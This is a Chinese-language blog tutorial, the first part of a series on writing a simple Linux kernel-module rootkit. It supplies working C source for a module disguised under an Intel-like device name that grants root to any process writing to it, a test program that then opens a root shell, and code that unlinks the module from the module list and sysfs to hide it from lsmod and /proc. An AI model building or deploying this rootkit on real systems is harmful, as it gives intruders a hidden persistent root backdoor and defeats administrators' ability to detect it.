> 原文链接: https://www.anquanke.com//post/id/246749 


# 简易 Linux Rootkit 编写入门指北（一）：模块隐藏与进程提权


                                阅读量   
                                **76247**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01cf03582e6c441b5f.jpg)](https://p2.ssl.qhimg.com/t01cf03582e6c441b5f.jpg)



## 0x00.概述

「Rootkit」即「root kit」，直译为中文便是「根权限工具包」的意思，在今天的语境下更多指的是一种被作为驱动程序、加载到操作系统内核中的恶意软件，这一类恶意软件的主要用途便是「驻留在计算机上提供 root 后门」——当攻击者再次拿到某个服务器的 shell 时可以通过 rootkit 快速提权到 root

Linux 下的 rootkit 主要以「可装载内核模块」（LKM）的形式存在，作为内核的一部分**直接以 ring0 权限向入侵者提供服务**；当攻击者拿到某台计算机的 shell 并通过相应的漏洞提权到 root 之后便可以在计算机中留下 rootkit，以**为攻击者后续入侵行为提供驻留的 root 后门**

但是作为内核的一部分，**LKM 编程在一定意义上便是内核编程，与内核版本密切相关，只有使用相应版本内核源码进行编译的 LKM 才可以装载到对应版本的 kernel 上**，这使得 Linux rootkit 显得有些鸡肋（例如服务器管理员某天升级内核版本你就被扬了），且不似蠕虫病毒那般可以在服务期间肆意传播，但不可否认的是 rootkit 仍是当前 Linux 下较为主流的 root 后门驻留技术之一

本篇文章仅为最基础的 rootkit 编写入门指南，若是需要成熟可用的 rootkit 可以参见 [f0rb1dd3n/Reptile: LKM Linux rootkit (github.com)](https://github.com/f0rb1dd3n/Reptile)

本篇引用的内核源码来自于 Linux 内核版本 `5.11`

> Linux 下尝试装载不同版本的 LKM 会显示如下错误信息：
<pre><code class="hljs sql">insmod: ERROR: could not insert module hellokernel.ko: Invalid module format
</code></pre>



## 0x01. 最简单的 LKM

> 这里不会叙述太多 Linux 内核编程相关的知识，主要以 rootkit 编写所会用到的一些技术为主
基本的 LKM 编写入门见[这里](https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#%E4%BA%94%E3%80%81%E7%BC%96%E5%86%99%E5%8F%AF%E8%A3%85%E8%BD%BD%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%EF%BC%88LKMs%EF%BC%89)

以下给出了一个最基础的 LKM 模板，注册了一个字符型设备作为后续使用的接口

> rootkit.c

```
/*
* rootkit.ko
* developed by arttnba3
*/
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/device.h&gt;
#include "functions.c"

static int __init rootkit_init(void)
`{`
    // register device
    major_num = register_chrdev(0, DEVICE_NAME, &amp;a3_rootkit_fo);     // major number 0 for allocated by kernel
    if(major_num &lt; 0)
        return major_num;   // failed

    // create device class
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class))
    `{`
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_class);
    `}`

    // create device inode
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
    if(IS_ERR(module_device))   // failed
    `{`
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_device);
    `}`

    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);
    if (IS_ERR(__file))            // failed
    `{`
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(__file);
    `}`
    __inode = file_inode(__file);
    __inode-&gt;i_mode |= 0666;
    filp_close(__file, NULL);

    return 0;
`}`

static void __exit rootkit_exit(void)
`{`
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
`}`

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
```

> functions.c

```
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/device.h&gt;
#include "rootkit.h"

static int a3_rootkit_open(struct inode * __inode, struct file * __file)
`{`
    return 0;
`}`

static ssize_t a3_rootkit_read(struct file * __file, char __user * user_buf, size_t size, loff_t * __loff)
`{`
    return 0;
`}`

static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_buf, size_t size, loff_t * __loff)
`{`
    return 0;
`}`

static int a3_rootkit_release(struct inode * __inode, struct file * __file)
`{`
    printk(KERN_INFO "get info");
    return 0;
`}`

static long a3_rootkit_ioctl(struct file * __file, unsigned int cmd, unsigned long param)
`{`
    return 0;
`}`
```

> rootkit.h

```
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/device.h&gt;

// a difficult-to-detect name
#define DEVICE_NAME "intel_rapl_msrdv"
#define CLASS_NAME "intel_rapl_msrmd"
#define DEVICE_PATH "/dev/intel_rapl_msrdv"

static int major_num;
static struct class * module_class = NULL;
static struct device * module_device = NULL;
static struct file * __file = NULL;
struct inode * __inode = NULL;

static int __init rootkit_init(void);
static void __exit rootkit_exit(void);

static int a3_rootkit_open(struct inode *, struct file *);
static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static int a3_rootkit_release(struct inode *, struct file *);
static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations a3_rootkit_fo = 
`{`
    .owner = THIS_MODULE,
    .unlocked_ioctl = a3_rootkit_ioctl,
    .open = a3_rootkit_open,
    .read = a3_rootkit_read,
    .write = a3_rootkit_write,
    .release = a3_rootkit_release,
`}`;
```

> makefile

```
# Makefile2.6
obj-m += rootkit.o
CURRENT_PATH := $(shell pwd)
LINUX_KERNEL := $(shell uname -r)
LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL)
all:
    make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules
clean:
    make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean
```

我们接下来将以该模块作为蓝本进行修改



## 0x02.进程权限提升

### <a class="reference-link" name="cred%20%E7%BB%93%E6%9E%84%E4%BD%93"></a>cred 结构体

对于 Linux 下的每一个进程，在 kernel 中都有着一个结构体 `cred` 用以标识其权限，该结构体定义于内核源码`include/linux/cred.h`中，如下：

```
struct cred `{`
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC    0x43736564
#define CRED_MAGIC_DEAD    0x44656144
#endif
    kuid_t        uid;        /* real UID of the task */
    kgid_t        gid;        /* real GID of the task */
    kuid_t        suid;        /* saved UID of the task */
    kgid_t        sgid;        /* saved GID of the task */
    kuid_t        euid;        /* effective UID of the task */
    kgid_t        egid;        /* effective GID of the task */
    kuid_t        fsuid;        /* UID for VFS ops */
    kgid_t        fsgid;        /* GID for VFS ops */
    unsigned    securebits;    /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;    /* caps we're permitted */
    kernel_cap_t    cap_effective;    /* caps we can actually use */
    kernel_cap_t    cap_bset;    /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char    jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key    *session_keyring; /* keyring inherited over fork */
    struct key    *process_keyring; /* keyring private to this process */
    struct key    *thread_keyring; /* keyring private to this thread */
    struct key    *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;    /* subjective LSM security */
#endif
    struct user_struct *user;    /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;    /* supplementary groups for euid/fsgid */
    /* RCU deletion */
    union `{`
        int non_rcu;            /* Can we skip RCU deletion? */
        struct rcu_head    rcu;        /* RCU deletion hook */
    `}`;
`}` __randomize_layout;
```

我们主要关注 uid ，一个cred结构体中记载了**一个进程四种不同的用户ID**：
<li>
**真实用户ID**（real UID）：标识一个进程**启动时的用户ID**
</li>
<li>
**保存用户ID**（saved UID）：标识一个进程**最初的有效用户ID**
</li>
<li>
**有效用户ID**（effective UID）：标识一个进程**正在运行时所属的用户ID**，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的</li>
<li>
**文件系统用户ID**（UID for VFS ops）：标识一个进程**创建文件时进行标识的用户ID**
</li>
### <a class="reference-link" name="%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"></a>权限提升

> Linux kernel 进程权限相关细节不在此赘叙，可以参见[这里](https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#%E5%9B%9B%E3%80%81%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86)

cred 结构体中存储了进程的 effective uid，那么我们不难想到，若是我们直接改写一个进程对应的 cred 结构体，我们便能直接改变其执行权限

而在 Linux 中 `root` 用户的 uid 为 0，若是我们将一个进程的 uid 都改为 0，该进程便获得了 root 权限

**<a class="reference-link" name="%E6%96%B9%E6%B3%95I.%E8%B0%83%E7%94%A8commit_creds(prepare_kernel_cred(NULL))"></a>方法I.调用commit_creds(prepare_kernel_cred(NULL))**

> pwn 选手应该都挺熟悉这个hhhh

在内核空间有如下两个函数，都位于`kernel/cred.c`中：
<li>
`struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是`daemon`参数应为**有效的进程描述符地址或NULL**
</li>
<li>
`int commit_creds(struct cred *new)`：该函数用以将一个新的`cred`结构体应用到进程</li>
查看`prepare_kernel_cred()`函数源码，观察到如下逻辑：

```
struct cred *prepare_kernel_cred(struct task_struct *daemon)
`{`
    const struct cred *old;
    struct cred *new;

    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
    if (!new)
        return NULL;

    kdebug("prepare_kernel_cred() alloc %p", new);

    if (daemon)
        old = get_task_cred(daemon);
    else
        old = get_cred(&amp;init_cred);
...
```

在`prepare_kernel_cred()`函数中，若传入的参数为NULL，则会缺省使用`init`进程的`cred`作为模板进行拷贝，**即可以直接获得一个标识着root权限的cred结构体**

那么我们不难想到，只要我们能够在内核空间执行`commit_creds(prepare_kernel_cred(NULL))`，那么就能够将进程的权限提升到`root`

我们来简单测试一下：修改 write 函数，在用户向设备写入时将其提权到 root：

```
static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_buf, size_t size, loff_t * __loff)
`{`
    commit_creds(prepare_kernel_cred(NULL));
    return 0;
`}`
```

测试例程：

```
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;

int main(void)
`{`
    int fd = open("/dev/intel_rapl_msrdv", O_RDWR);
    write(fd, "aaaa", 4);
    sleep(2);
    system("/bin/sh");
`}`
```

简单测试一下，可以看到当我们的进程写入设备之后便提权到了 root

[![](https://p1.ssl.qhimg.com/t01aa0482b65b9350ac.png)](https://p1.ssl.qhimg.com/t01aa0482b65b9350ac.png)

**<a class="reference-link" name="%E6%96%B9%E6%B3%95II.%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9%20cred%20%E7%BB%93%E6%9E%84%E4%BD%93"></a>方法II.直接修改 cred 结构体**

前面我们讲到，`prepare_kernel_cred()` 函数用以将一个新的 cred 应用到当前进程，我们来观察其源码相应逻辑：

```
int commit_creds(struct cred *new)
`{`
    struct task_struct *task = current;
    const struct cred *old = task-&gt;real_cred;

    ...
```

在该函数开头直接通过宏 `current` 获取当前进程的 `task_struct`，随后修改的是其成员 `real_cred`，那么我们在内核模块中同样可以直接通过该宏获取当前进程的 task_struct 结构体，从而直接修改其 real_cred 中的 uid 以实现到 root 的提权

那么我们的代码可以修改如下：

```
static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_buf, size_t size, loff_t * __loff)
`{`
    struct task_struct *task = current;
    struct cred *old = task-&gt;real_cred;
    old-&gt;gid = old-&gt;sgid = old-&gt;egid = KGIDT_INIT(0);
    old-&gt;uid = old-&gt;suid = old-&gt;euid = KUIDT_INIT(0);
    return 0;
`}`
```

这里需要注意的是 uid 与 gid 的类型为封装为结构体的 `kuid_t` 与 `kgid_t` 类型，应当使用宏 `KGIDT_INIT()` 与 `KUIDT_INIT()` 进行赋值

还是使用之前的例程简单测试一下，可以看到当我们的进程写入设备之后便提权到了 root，不同的是我们只修改了几个 uid 和 gid，所以原进程的其他信息依旧会保留，这里也可以选择把其他的一并改掉

[![](https://p3.ssl.qhimg.com/t01fb5ed69b5ba25d45.png)](https://p3.ssl.qhimg.com/t01fb5ed69b5ba25d45.png)

<a class="reference-link" name="current%EF%BC%9ACPU%20%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E4%BF%9D%E5%AD%98%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%20task_struct%20%E7%BB%93%E6%9E%84%E4%BD%93"></a>**current：CPU 局部变量保存当前进程 task_struct 结构体**

这里**简单**讲一下宏 `current` 的是如何获取当前进程的 task_struct 的：该宏定义于内核源码 `arch/x6/include/asm/current.h` 中，展开后为函数 `static __always_inline struct task_struct *get_current(void)` ，该函数只有一句 `return this_cpu_read_stable(current_task);`：

其中 `current_task` 为 CPU 局部变量，在头文件开头使用宏 `DECLARE_PER_CPU` 从外部引入该变量，该宏定义于 `include/linux/percpu-defs.h` 中，展开后为 `DECLARE_PER_CPU_SECTION(type, name, "")`，该宏再度展开为 `extern __PCPU_ATTRS(sec) __typeof__(type) name`，该宏再度展开为 `__percpu __attribute__((section(PER_CPU_BASE_SECTION sec))) PER_CPU_ATTRIBUTES`，其中宏 `PER_CPU_BASE_SECTION` 定义于 `include/asm-generic/percpu.h`中，SMP（多对称处理）下展开为字符串 `".data..percpu"`。最终展开为 `__attribute__((section(".data..percpu"))) (type) name`，其中 `__attribute__` 宏为 gcc 的特殊机制，具体的参见[手册](https://gcc.gnu.org/onlinedocs/gcc-10.2.0/gcc/Common-Function-Attributes.html#Common-Function-Attributes)

那么我们可以知道该宏最终便是**外部引用了一个位于 .data..percpu 这一数据段中**的 task_struct 类型的变量 current_task

接下来看宏 `this_cpu_read_stable`，该宏定义于 `arch/x86/include/asm/percpu.h` 中，展开为 `__pcpu_size_call_return(this_cpu_read_stable_, pcp)`，再度展开为如下：

```
#define __pcpu_size_call_return(stem, variable)                \
(`{`                                    \
    typeof(variable) pscr_ret__;                    \
    __verify_pcpu_ptr(&amp;(variable));                    \
    switch(sizeof(variable)) `{`                    \
    case 1: pscr_ret__ = stem##1(variable); break;            \
    case 2: pscr_ret__ = stem##2(variable); break;            \
    case 4: pscr_ret__ = stem##4(variable); break;            \
    case 8: pscr_ret__ = stem##8(variable); break;            \
    default:                            \
        __bad_size_call_parameter(); break;            \
    `}`                                \
    pscr_ret__;                            \
`}`)
```

开头先定义了一个变量 `pscr_ret__`，使用 `typeof` （GNU C 扩展关键字）获取 variable 的类型

其中宏 `__verify_pcpu_ptr()` 同样定义于该文件中，如下：

```
#define __verify_pcpu_ptr(ptr)                        \
do `{`                                    \
    const void __percpu *__vpp_verify = (typeof((ptr) + 0))NULL;    \
    (void)__vpp_verify;                        \
`}` while (0)
```

其中 `do...while(0)` 结构为约定熟成的「只执行一次的语句」的宏的书写形式，该宏中定义了一个 void 指针通过强制类型转换获取 NULL 转成 ptr 的类型给到该指针（好像没什么用…？），然后下一句再转为 NULL（空转，没有做任何其他诸如赋值一类的事情，笔者才疏学浅暂时不理解这么做的理由）

接下来根据变量 variable 的 size 进行宏拼接，前面我们传入的 `current_task` 变量为 `struct task_struct *` 指针类型，这里以 64 位系统为例，最终得到的拼接结果为宏 `this_cpu_read_stable_8`，定义于 `arch/x86/include/asm/percpu.h` 中（绕了一圈又回来了），展开为 `percpu_stable_op(8, "mov", pcp)`，再度展开为如下形式：

```
#define percpu_stable_op(size, op, _var)                \
(`{`                                    \
    __pcpu_type_##size pfo_val__;                    \
    asm(__pcpu_op2_##size(op, __percpu_arg(P[var]), "%[val]")    \
        : [val] __pcpu_reg_##size("=", pfo_val__)            \
        : [var] "p" (&amp;(_var)));                    \
    (typeof(_var))(unsigned long) pfo_val__;            \
`}`)
```

其中 `__pcpu_type_8` 展开为 `u64`，在多个头文件中都有定义，最终展开为`unsigned long long`的 typedef 别名

下一行使用了内联汇编，其中拼接后得到的宏 `__pcpu_op2_8(op, src, dst)` 同样位于这个头文件，展开为 `op "q " src ", " dst`；`__percpu_arg(x)`展开为 `__percpu_prefix "%" #x`， 再展开为 `"%%"__stringify(__percpu_seg)":"`：`__stringify` 展开为 `__stringify_1(x)` 展开为 `#x`，`__percpu_seg` 展开为 `gs`，合起来便是 `%%gs:%P[var]`；拼接宏 `__pcpu_reg_8(mod, x)` 展开为 `mod "r" (x)`

最终展开为如下形式：

```
unsigned long long pfo_val__;
asm("movq %%gs:%P[var], %[val]" \
: [val] "=r" (pfo_val__) \
: [var] "p" (&amp;(current_task)));
(struct task_struct *)(unsigned long) pfo_val__;
```

拨开 Linux 内核源码中的多层嵌套之后我们大抵能够明白该段代码的核心便是**以 gs 寄存器作为基址，取 current_task 变量偏移处值赋给 pfo_val__ 变量**，随后返回 pro_val__ 变量

那么为什么 gs 寄存器中存的地址在这个偏移上便是该进程的 task_struct 结构呢？这个和 percpu 机制有关，便不在此赘叙，大概就是每个 CPU 独立有一块地址空间，其中会存放包括当前进程的 task_struct 结构体等数据



## 0x03.模块隐藏

当我们将一个 LKM 装载到内核模块中之后，用户尤其是服务器管理员可以使用 `lsmod` 命令**发现你在服务器上留下的rootkit**

```
arttnba3@ubuntu:~/Desktop/DailyProgramming/rootkit$ sudo insmod rootkit.ko 
Password: 
arttnba3@ubuntu:~/Desktop/DailyProgramming/rootkit$ lsmod | grep 'rootkit'
rootkit                16384  0
```

虽然说我们可以把 rootkit 的名字改为「very_important_module_not_root_kit_please_donot_remove_it」一类的名字进行伪装从而通过社会工程学手段让用户难以发现异常，但是哪怕看起来再“正常”的名字也不能够保证不会被发现，因此我们需要**让用户无法直接发现我们的 rootkit**

### <a class="reference-link" name="PRE.%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%EF%BC%9Amodule%20%E7%BB%93%E6%9E%84%E4%BD%93"></a>PRE.内核中的内核模块：module 结构体

这里仅简要叙述，在内核当中使用结构体 `module` 来表示一个内核模块（定义于 `/include/linux/module.h`），多个内核模块通过成员 `list` （内核双向链表结构`list_head`，定义于`/include/linux/types.h` 中，仅有 next 与 prev 指针成员）构成双向链表结构

在内核模块编程中，我们可以通过宏 `THIS_MODULE` （定义于 `include/linux/export.h`）或者直接用其宏展开 `&amp;__list_module` 来获取当前内核模块的 module 结构体，

### <a class="reference-link" name="Step-I.%20/proc/modules%20%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"></a>Step-I. /proc/modules 信息隐藏

Linux 下用以查看模块的命令 `lsmod` 其实是从 `/proc/modules` 这个文件中读取并进行整理，该文件的内容来自于内核中的 module 双向链表，那么我们只需要将 rootkit 从双向链表中移除即可完成 procfs 中的隐藏

熟悉内核编程的同学应该都知道 `list_del_init()` 函数用以进行内核双向链表脱链操作，该函数定义于 `/include/linux/list.h` 中，多重套娃展开后其核心**主要是常规的双向链表脱链**，那么在这里我们其实可以直接手写双向链表的脱链工作

我们还需要考虑到多线程操作的影响，阅读 `rmmod` 背后的系统调用 `delete_module` 源码（位于 `kernel/module.c` 中），观察到其进入临界区前使用了一个互斥锁变量名为 `module_mutex`，我们的 unlink 操作也将使用该互斥锁以保证线程安全（毕竟我们进来不是直接搞破坏的hhh）

在模块初始化函数末尾添加如下：

```
static int __init rootkit_init(void)
`{`
...

    // unlink from module list
    struct list_head * list = (&amp;__this_module.list);
    mutex_lock(&amp;module_mutex);
    list-&gt;prev-&gt;next = list-&gt;next;
    list-&gt;next-&gt;prev = list-&gt;prev;
    mutex_unlock(&amp;module_mutex);

    return 0;
`}`
```

将我们的 rootkit 重新 make 后加载到内核中，我们会发现 **lsmod 命令已经无法发现我们的 rootkit，在 /proc/modules 文件中已经没有我们 rootkit 的信息**，与此同时我们的 rootkit **所提供的功能一切正常**

但同样地，无论是载入还是卸载内核模块都需要对双向链表进行操作，由于我们的 rootkit 已经脱链故**我们无法将其卸载**，同样地也无法将其再次载入（虽然说似乎并没有必要做这两件事情，因为 rootkit 一次载入后应当是要长久驻留在内核中的）

[![](https://p3.ssl.qhimg.com/t018827863075972add.png)](https://p3.ssl.qhimg.com/t018827863075972add.png)

### <a class="reference-link" name="Step-II.%20/sys/module/%20%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"></a>Step-II. /sys/module/ 信息隐藏

sysfs 与 procfs 相类似，同样是一个基于 RAM 的虚拟文件系统，它的作用是将内核信息以文件的方式提供给用户程序使用，其中便包括我们的 rootkit 模块信息，sysfs 会动态读取内核中的 kobject 层次结构并在 `/sys/module/` 目录下生成文件

这里简单讲一下 kobject：Kobject 是 Linux 中的设备数据结构基类，在内核中为 `struct kobject` 结构体，通常内嵌在其他数据结构中；每个设备都有一个 kobject 结构体，多个 kobject 间通过内核双向链表进行链接；kobject 之间构成层次结构

> kobject 更多信息参见[https://zhuanlan.zhihu.com/p/104834616](https://zhuanlan.zhihu.com/p/104834616)

熟悉内核编程的同学应该都知道我们可以使用 `kobject_del()` 函数（定义于 `/lib/kobject.c`中）来将一个 kobject 从层次结构中脱离，这里我们将在我们的 rootkit 的 init 函数末尾使用这个函数：

```
static int __init rootkit_init(void)
`{`
...

    // unlink from kobject
    kobject_del(&amp;__this_module.mkobj.kobj);

    return 0;
`}`
```

简单测试，我们可以发现无论是在 procfs 中还是 sysfs 中都已经没有了我们的 rootkit 的身影，而提权的功能依旧正常，我们很好地完成了隐藏模块的功能

[![](https://p0.ssl.qhimg.com/t01bc7b21f27cd5081e.png)](https://p0.ssl.qhimg.com/t01bc7b21f27cd5081e.png)



## 0xFF What’s more?

在后续文章中笔者将会讲述：
- 文件隐藏（filldir hook）
- 进程隐藏（脱离 cred_jar 进行简易内存分配）
- 驻留技术（systemd，initrd…）
- ……